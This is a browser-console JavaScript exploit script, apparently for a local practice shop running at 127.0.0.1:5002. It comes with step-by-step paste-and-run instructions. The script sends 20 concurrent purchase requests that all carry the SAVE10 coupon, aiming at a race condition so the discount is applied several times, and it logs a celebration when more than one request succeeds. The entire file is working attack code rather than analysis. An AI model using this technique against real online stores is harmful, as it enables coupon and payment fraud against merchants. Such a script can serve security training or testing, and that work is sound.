/**
 * SIMPLE BROWSER RACE CONDITION EXPLOIT
 * ====================================
 * 
 * INSTRUCTIONS:
 * 1. Make sure you have items in cart with SAVE10 coupon applied
 * 2. Go to checkout page (http://127.0.0.1:5002/checkout)
 * 3. Open Developer Tools (F12) → Console tab
 * 4. Paste this ENTIRE script and press Enter
 * 5. Watch the magic happen!
 */

console.clear();
console.log("🚀 STARTING SIMPLE RACE CONDITION EXPLOIT");
console.log("==========================================");

// Function to send purchase request
async function sendPurchase(id) {
    try {
        const response = await fetch('/purchase', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'coupon_code=SAVE10',
            credentials: 'same-origin'
        });
        
        console.log(`🎯 Request ${id}: HTTP ${response.status}`);
        return {
            id: id,
            status: response.status,
            success: response.status === 302 || response.status === 200
        };
    } catch (error) {
        console.log(`❌ Request ${id}: ERROR - ${error.message}`);
        return { id: id, success: false, error: error.message };
    }
}

// Launch attack
console.log("🚨 Launching 20 concurrent requests in 3... 2... 1...");

setTimeout(async () => {
    const promises = [];
    
    // Create 20 concurrent requests
    for (let i = 1; i <= 20; i++) {
        promises.push(sendPurchase(i));
    }
    
    // Wait for all to complete
    const results = await Promise.all(promises);
    
    // Count results
    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;
    
    console.log("📊 RACE CONDITION RESULTS:");
    console.log(`   Successful: ${successful}`);
    console.log(`   Failed: ${failed}`);
    
    if (successful > 1) {
        console.log("🎉 RACE CONDITION EXPLOITED!");
        console.log("💰 Multiple discount applications occurred!");
        console.log("🔄 Reloading page to see results...");
        setTimeout(() => location.reload(), 2000);
    } else if (successful === 1) {
        console.log("⚠️  Only 1 request succeeded");
        console.log("💡 Try running the script again!");
    } else {
        console.log("❌ No requests succeeded");
        console.log("💡 Make sure you have items in cart!");
    }
}, 1000);

console.log("⏳ Preparing attack...");
